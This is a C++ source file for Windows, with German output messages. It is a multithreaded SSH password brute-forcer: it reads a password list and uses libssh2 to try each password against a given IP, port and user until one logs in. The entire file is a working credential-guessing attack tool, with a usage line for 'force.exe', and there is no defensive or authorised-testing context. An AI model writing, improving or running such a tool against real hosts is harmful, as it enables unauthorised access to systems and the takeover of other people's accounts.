#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <mutex>
#include <atomic>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <libssh2.h>

std::mutex print_mutex;
std::atomic<bool> found(false);

bool test_ssh_login(const std::string& target, int port, const std::string& user, const std::string& pass) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return false;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }

    sockaddr_in sin;
    sin.sin_family = AF_INET;
    inet_pton(AF_INET, target.c_str(), &sin.sin_addr);
    sin.sin_port = htons(port);

    DWORD timeout = 4000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

    if (connect(sock, (struct sockaddr*)(&sin), sizeof(sin)) != 0) {
        closesocket(sock);
        WSACleanup();
        return false;
    }

    LIBSSH2_SESSION *session = libssh2_session_init();
    if (!session) {
        closesocket(sock);
        WSACleanup();
        return false;
    }

    if (libssh2_session_handshake(session, sock) != 0) {
        libssh2_session_free(session);
        closesocket(sock);
        WSACleanup();
        return false;
    }

    int rc = libssh2_userauth_password(session, user.c_str(), pass.c_str());
    bool success = (rc == 0);

    libssh2_session_disconnect(session, "Normal Shutdown");
    libssh2_session_free(session);
    closesocket(sock);
    WSACleanup();

    return success;
}

void worker(std::string target, int port, std::string user, std::vector<std::string> passwords, int start_idx, int end_idx) {
    for (int i = start_idx; i < end_idx; ++i) {
        if (found.load()) return;

        if (test_ssh_login(target, port, user, passwords[i])) {
            std::lock_guard<std::mutex> lock(print_mutex);
            std::cout << "\n\n[+] TREFFER GEFUNDEN! Passwort: " << passwords[i] << std::endl;
            found.store(true);
            return;
        } else {
            std::lock_guard<std::mutex> lock(print_mutex);
            std::cout << "[-] Getestet: " << passwords[i] << "               \r" << std::flush;
        }
    }
}

int main(int argc, char* argv[]) {
    try {
        std::cout << "[*] Programm gestartet...\n";

        if (argc < 5) {
            std::cout << "[-] Fehler: Zu wenige Argumente!\n";
            std::cout << "Nutzung: force.exe <Ziel-IP> <Port> <User> <Passwort-Datei>\n";
            return 1;
        }

        std::string target = argv[1];
        int port = std::stoi(argv[2]);
        std::string user = argv[3];
        std::string list_file = argv[4];

        std::cout << "[*] Öffne Passwort-Datei: " << list_file << "\n";
        std::ifstream file(list_file);
        if (!file.is_open()) {
            std::cout << "[-] FEHLER: Konnte Passwort-Datei '" << list_file << "' nicht öffnen!\n";
            return 1;
        }

        std::vector<std::string> passwords;
        std::string line;
        while (std::getline(file, line)) {
            if (!line.empty()) passwords.push_back(line);
        }
        file.close();

        std::cout << "[*] " << passwords.size() << " Passwörter erfolgreich eingelesen.\n";
        if (passwords.empty()) {
            std::cout << "[-] FEHLER: Die Passwort-Datei ist leer!\n";
            return 1;
        }

        std::cout << "[*] Initialisiere libssh2...\n";
        if (libssh2_init(0) != 0) {
            std::cout << "[-] FEHLER bei libssh2_init()\n";
            return 1;
        }

        std::cout << "[*] Starte SSH-Test gegen " << target << ":" << port << "...\n";

        int num_threads = 5;
        if (passwords.size() < (size_t)num_threads) num_threads = passwords.size();
        int chunk_size = passwords.size() / num_threads;
        std::vector<std::thread> threads;

        for (int i = 0; i < num_threads; ++i) {
            int start = i * chunk_size;
            int end = (i == num_threads - 1) ? passwords.size() : (start + chunk_size);
            threads.emplace_back(worker, target, port, user, passwords, start, end);
        }

        for (auto& th : threads) {
            th.join();
        }

        libssh2_exit();
        std::cout << "\n[+] Fertig.\n";

    } catch (const std::exception& e) {
        std::cout << "[-] AUSNAHMEFEHLER (Exception): " << e.what() << "\n";
        return 1;
    } catch (...) {
        std::cout << "[-] UNBEKANNTER FEHLER aufgetreten!\n";
        return 1;
    }

    return 0;
}